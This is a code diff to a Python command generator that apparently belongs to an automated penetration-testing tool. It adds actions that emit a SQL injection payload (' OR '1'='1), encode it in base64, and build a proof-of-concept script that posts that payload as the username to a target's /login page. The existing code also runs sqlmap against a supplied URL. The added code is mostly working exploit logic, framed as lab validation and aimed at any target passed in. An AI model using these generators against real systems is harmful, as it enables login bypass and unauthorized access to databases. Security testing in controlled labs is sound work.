@@ -212,6 +212,10 @@ class CommandGenerator:
             return self._generate_vulnerability_scanning(parameters)
         elif action_name == "SQLInjectionProbe":
             return self._generate_sql_injection_probe(parameters)
+        elif action_name == "PayloadGeneration":
+            return self._generate_payload_generation(parameters)
+        elif action_name == "ExploitScriptGeneration":
+            return self._generate_exploit_script_generation(parameters)
         else:
             logger.warning("Unknown action '%s'. Returning fallback echo.", action_name)
             return GeneratedCommand(
@@ -402,4 +406,37 @@ class CommandGenerator:
         return GeneratedCommand(
             shell_command=f"sqlmap -u {safe_url} --batch --level 2 --risk 1",
             explanation=f"Probes a likely parameterized endpoint on {url} for SQL injection."
+        )
+
+    def _generate_payload_generation(self, params: Mapping[str, Any]) -> GeneratedCommand:
+        payload = params.get("payload", "' OR '1'='1")
+        safe_payload = shlex.quote(str(payload))
+        return GeneratedCommand(
+            shell_command=(
+                "python -c \"import base64; "
+                f"p={safe_payload}; "
+                "print('PAYLOAD_GENERATED'); "
+                "print('raw=' + p); "
+                "print('b64=' + base64.b64encode(p.encode()).decode())\""
+            ),
+            explanation="Generates a safe, encoded demonstration payload for exploit simulation."
+        )
+
+    def _generate_exploit_script_generation(self, params: Mapping[str, Any]) -> GeneratedCommand:
+        target = str(params.get("target_url") or params.get("target") or "http://localhost")
+        target_json = json.dumps(target)
+        return GeneratedCommand(
+            shell_command=(
+                "python -c \"import json; "
+                f"target={target_json}; "
+                "lines=['#!/usr/bin/env python3','import urllib.request','import urllib.parse','',"
+                "'target = ' + repr(target.rstrip('/')),"
+                "'post_data = urllib.parse.urlencode([(\\\"username\\\", \\\"\\\\\\' OR \\\\\\'1\\\\\\'=\\\\\\'1\\\"), (\\\"password\\\", \\\"test\\\")]).encode()',"
+                "'req = urllib.request.Request(target + \\\"/login\\\", data=post_data)',"
+                "'resp = urllib.request.urlopen(req, timeout=5)',"
+                "'print(\\\"status=\\\", resp.status)',"
+                "'print(resp.read(300).decode(\\\"utf-8\\\", \\\"ignore\\\"))']; "
+                "print('SCRIPT_GENERATED'); print('\\\\n'.join(lines))\""
+            ),
+            explanation="Builds a PoC exploit script template for controlled lab validation."
         )
